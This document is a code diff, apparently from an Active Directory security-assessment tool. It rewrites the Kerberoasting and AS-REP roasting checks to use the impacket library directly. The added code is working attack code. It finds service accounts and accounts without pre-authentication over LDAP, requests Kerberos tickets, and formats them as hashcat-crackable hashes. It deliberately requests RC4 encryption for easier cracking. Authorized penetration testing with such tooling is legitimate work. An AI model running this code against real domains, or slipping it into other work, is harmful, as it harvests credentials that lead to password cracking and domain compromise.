@@ -1,9 +1,19 @@
-"""Kerberoasting and AS-REP roasting checks using impacket CLI tools."""
+"""Kerberoasting and AS-REP roasting checks using impacket library."""
 
-import subprocess
-import shutil
 from typing import Dict, List, Optional
 from pathlib import Path
+from datetime import datetime, timedelta
+
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import TGS_REP, AS_REQ, seq_set, seq_set_iter, AS_REP, KERB_PA_PAC_REQUEST, KRB_ERROR
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+from impacket.krb5.ccache import CCache
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+import socket
+import random
 
 from ...utils.logger import get_logger
 from ...utils.ldap import LDAPConnection
@@ -26,6 +36,14 @@ class RoastingChecker:
         self.password = password
         self.dc_ip = dc_ip or ldap_conn.config.server
         self.hashes = hashes
+        
+        # Parse hashes if provided
+        self.lm_hash = ''
+        self.nt_hash = ''
+        if hashes and ':' in hashes:
+            self.lm_hash, self.nt_hash = hashes.split(':')
+        elif hashes:
+            self.nt_hash = hashes
     
     def check_roasting(self):
         """Run all roasting-related checks."""
@@ -96,68 +114,90 @@ class RoastingChecker:
             self.logger.error(f"[-] Error checking kerberoastable users: {e}")
     
     def _run_getuserspns(self, output_file: Path):
-        """Run GetUserSPNs.py to extract TGS hashes."""
+        """Request TGS tickets for kerberoastable users using impacket library."""
         try:
-            getuserspns = shutil.which('GetUserSPNs.py')
-            if not getuserspns:
-                self.logger.warning("[W] GetUserSPNs.py not found in PATH")
+            self.logger.info("[+] Requesting TGS tickets for kerberoasting...")
+            
+            # Get TGT first
+            user_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            
+            try:
+                if self.nt_hash:
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+                        user_name, '', self.domain,
+                        bytes.fromhex(self.lm_hash) if self.lm_hash else b'',
+                        bytes.fromhex(self.nt_hash),
+                        None, self.dc_ip
+                    )
+                else:
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+                        user_name, self.password, self.domain,
+                        b'', b'', None, self.dc_ip
+                    )
+            except KerberosError as e:
+                self.logger.warning(f"[W] Failed to get TGT: {e}")
                 return
             
-            self.logger.info("[+] Running GetUserSPNs.py to extract hashes...")
+            # Query for SPN users
+            spn_users = self.ldap.query(
+                search_base=self.base_dn,
+                search_filter='(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+                attributes=['sAMAccountName', 'servicePrincipalName']
+            )
             
-            cmd = [
-                getuserspns,
-                '-request',
-                '-dc-ip', self.dc_ip,
-                '-outputfile', str(output_file)
-            ]
-            
-            if self.hashes:
-                cmd.extend(['-hashes', self.hashes])
-            
-            # Build target: domain/username:password or domain/username with -no-pass
-            target = f"{self.domain}/{self.username}"
-            if self.password and not self.hashes:
-                target = f"{target}:{self.password}"
-            
-            cmd.append(target)
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            
-            # Debug: show raw GetUserSPNs.py output
-            self.logger.debug(f"GetUserSPNs.py stdout:\n{result.stdout}")
-            self.logger.debug(f"GetUserSPNs.py stderr:\n{result.stderr}")
-            
-            hashes_found = []
-            
-            # Check output file first
-            if output_file.exists():
-                content = output_file.read_text().strip()
-                hashes_found = [h for h in content.split('\n') if h and '$krb5tgs$' in h]
-            
-            # If no hashes in file, check stdout (some versions output there)
-            if not hashes_found and result.stdout:
-                hashes_found = [h for h in result.stdout.split('\n') if '$krb5tgs$' in h]
-                if hashes_found:
-                    # Write stdout hashes to file
-                    with open(output_file, 'w') as f:
-                        f.write('\n'.join(hashes_found))
-            
-            if hashes_found:
-                self.logger.warning(f"[W] Extracted {len(hashes_found)} TGS hashes")
-                print(f"[*] Hashes saved to {output_file}")
-            elif result.returncode == 0:
-                self.logger.info("[+] No TGS hashes extracted (may need different credentials)")
-            else:
-                if "no entries" in result.stderr.lower() or "0 entries" in result.stdout.lower():
-                    self.logger.info("[+] No kerberoastable entries found")
-                else:
-                    self.logger.warning(f"[W] GetUserSPNs.py: {result.stderr.strip() or result.stdout.strip()}")
+            hashes = []
+            for user in spn_users:
+                sam = user.get('sAMAccountName', '')
+                spns = user.get('servicePrincipalName', [])
+                if isinstance(spns, str):
+                    spns = [spns]
                 
-        except subprocess.TimeoutExpired:
-            self.logger.warning("[W] GetUserSPNs.py timed out")
+                for spn in spns:
+                    try:
+                        server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSessionKey2, sessionKey2 = getKerberosTGS(
+                            server_name, self.domain, None, tgt, cipher, sessionKey
+                        )
+                        
+                        # Format hash for hashcat
+                        hash_str = self._format_tgs_hash(tgs, cipher, sam, spn)
+                        if hash_str:
+                            hashes.append(hash_str)
+                        break  # One hash per user is enough
+                    except KerberosError as e:
+                        self.logger.debug(f"Failed to get TGS for {spn}: {e}")
+                        continue
+            
+            if hashes:
+                write_lines(hashes, output_file)
+                self.logger.warning(f"[W] Extracted {len(hashes)} TGS hashes")
+                print(f"[*] Hashes saved to {output_file}")
+            else:
+                self.logger.info("[+] No TGS hashes extracted (may need different credentials)")
+                
         except Exception as e:
-            self.logger.error(f"[-] Error running GetUserSPNs.py: {e}")
+            self.logger.error(f"[-] Error during kerberoasting: {e}")
+    
+    def _format_tgs_hash(self, tgs, cipher, username: str, spn: str) -> Optional[str]:
+        """Format TGS ticket as hashcat-compatible hash."""
+        try:
+            decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+            enc_part = decoded['ticket']['enc-part']
+            etype = int(enc_part['etype'])
+            cipher_data = bytes(enc_part['cipher']).hex()
+            
+            # Hashcat format for krb5tgs
+            if etype == 23:  # RC4
+                return f"$krb5tgs$23$*{username}${self.domain}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
+            elif etype == 17:  # AES128
+                return f"$krb5tgs$17${self.domain}${username}$*{spn}*${cipher_data[:32]}${cipher_data[32:]}"
+            elif etype == 18:  # AES256
+                return f"$krb5tgs$18${self.domain}${username}$*{spn}*${cipher_data[:32]}${cipher_data[32:]}"
+            else:
+                return f"$krb5tgs${etype}$*{username}${self.domain}${spn}*${cipher_data}"
+        except Exception as e:
+            self.logger.debug(f"Failed to format hash: {e}")
+            return None
     
     def _check_asrep_roastable(self):
         """Check for AS-REP roastable users and request AS-REPs."""
@@ -193,49 +233,123 @@ class RoastingChecker:
             self.logger.error(f"[-] Error checking AS-REP roastable users: {e}")
     
     def _run_getnpusers(self, output_file: Path, users: List[Dict]):
-        """Run GetNPUsers.py to extract AS-REP hashes."""
+        """Request AS-REP hashes for users without pre-auth using impacket library."""
         try:
-            getnpusers = shutil.which('GetNPUsers.py')
-            if not getnpusers:
-                self.logger.warning("[W] GetNPUsers.py not found in PATH")
-                return
+            self.logger.info("[+] Requesting AS-REP hashes...")
             
-            self.logger.info("[+] Running GetNPUsers.py to extract AS-REP hashes...")
-            
-            # Write users to temp file
-            usernames = [u.get('sAMAccountName', '') for u in users if u.get('sAMAccountName')]
-            users_file = self.output_paths['data'] / 'asrep_users.txt'
-            write_lines(usernames, users_file)
-            
-            cmd = [
-                getnpusers,
-                '-request',
-                '-dc-ip', self.dc_ip,
-                '-format', 'hashcat',
-                '-outputfile', str(output_file),
-                '-usersfile', str(users_file),
-                f"{self.domain}/"
-            ]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            
-            # Debug: show raw GetNPUsers.py output
-            self.logger.debug(f"GetNPUsers.py stdout:\n{result.stdout}")
-            self.logger.debug(f"GetNPUsers.py stderr:\n{result.stderr}")
-            
-            if result.returncode == 0 or result.returncode == 1:  # 1 = no users found
-                if output_file.exists():
-                    content = output_file.read_text().strip()
-                    hashes = [h for h in content.split('\n') if h and not h.startswith('#')]
-                    if hashes:
-                        self.logger.warning(f"[W] Extracted {len(hashes)} AS-REP hashes")
-                        print(f"[*] Hashes saved to {output_file}")
-                    else:
-                        self.logger.info("[+] No AS-REP hashes extracted")
-            else:
-                self.logger.warning(f"[W] GetNPUsers.py: {result.stderr.strip()}")
+            hashes = []
+            for user in users:
+                username = user.get('sAMAccountName', '')
+                if not username:
+                    continue
                 
-        except subprocess.TimeoutExpired:
-            self.logger.warning("[W] GetNPUsers.py timed out")
+                try:
+                    hash_str = self._get_asrep_hash(username)
+                    if hash_str:
+                        hashes.append(hash_str)
+                except Exception as e:
+                    self.logger.debug(f"Failed to get AS-REP for {username}: {e}")
+                    continue
+            
+            if hashes:
+                write_lines(hashes, output_file)
+                self.logger.warning(f"[W] Extracted {len(hashes)} AS-REP hashes")
+                print(f"[*] Hashes saved to {output_file}")
+            else:
+                self.logger.info("[+] No AS-REP hashes extracted")
+                
         except Exception as e:
-            self.logger.error(f"[-] Error running GetNPUsers.py: {e}")
+            self.logger.error(f"[-] Error during AS-REP roasting: {e}")
+    
+    def _get_asrep_hash(self, username: str) -> Optional[str]:
+        """Get AS-REP hash for a user without pre-authentication."""
+        from binascii import hexlify
+        try:
+            # Build AS-REQ without pre-authentication (based on NetExec implementation)
+            client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            
+            as_req = AS_REQ()
+            
+            domain = self.domain.upper()
+            server_name = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            
+            # Build PA-PAC-REQUEST
+            pac_request = KERB_PA_PAC_REQUEST()
+            pac_request["include-pac"] = True
+            encoded_pac_request = encoder.encode(pac_request)
+            
+            as_req["pvno"] = 5
+            as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+            
+            as_req["padata"] = noValue
+            as_req["padata"][0] = noValue
+            as_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+            as_req["padata"][0]["padata-value"] = encoded_pac_request
+            
+            req_body = seq_set(as_req, "req-body")
+            
+            opts = []
+            opts.extend((constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value))
+            req_body["kdc-options"] = constants.encodeFlags(opts)
+            
+            seq_set(req_body, "sname", server_name.components_to_asn1)
+            seq_set(req_body, "cname", client_name.components_to_asn1)
+            
+            req_body["realm"] = domain
+            
+            now = datetime.utcnow() + timedelta(days=1)
+            req_body["till"] = KerberosTime.to_asn1(now)
+            req_body["rtime"] = KerberosTime.to_asn1(now)
+            req_body["nonce"] = random.getrandbits(31)
+            
+            # Request RC4 first for easier cracking
+            supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+            seq_set_iter(req_body, "etype", supported_ciphers)
+            
+            message = encoder.encode(as_req)
+            
+            try:
+                r = sendReceive(message, domain, self.dc_ip)
+            except KerberosError as e:
+                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                    # RC4 not available, try AES
+                    supported_ciphers = (
+                        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
+                    )
+                    seq_set_iter(req_body, "etype", supported_ciphers)
+                    message = encoder.encode(as_req)
+                    r = sendReceive(message, domain, self.dc_ip)
+                else:
+                    raise
+            
+            # Try to decode as KRB_ERROR first
+            try:
+                as_rep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+                # If we get here, user requires preauth
+                self.logger.debug(f"User {username} requires pre-authentication")
+                return None
+            except Exception:
+                # Not an error, should be AS-REP
+                as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
+            
+            # Format hash for hashcat
+            etype = int(as_rep["enc-part"]["etype"])
+            cipher_bytes = as_rep["enc-part"]["cipher"].asOctets()
+            
+            hash_tgt = f"$krb5asrep${etype}${username}@{domain}:"
+            if etype in (17, 18):  # AES
+                hash_tgt += f"{hexlify(cipher_bytes[:12]).decode()}${hexlify(cipher_bytes[12:]).decode()}"
+            else:  # RC4
+                hash_tgt += f"{hexlify(cipher_bytes[:16]).decode()}${hexlify(cipher_bytes[16:]).decode()}"
+            
+            return hash_tgt
+                
+        except KerberosError as e:
+            if 'KDC_ERR_PREAUTH_REQUIRED' in str(e) or e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
+                return None
+            self.logger.debug(f"AS-REP request failed for {username}: {e}")
+            return None
+        except Exception as e:
+            self.logger.debug(f"AS-REP request failed for {username}: {e}")
+            return None
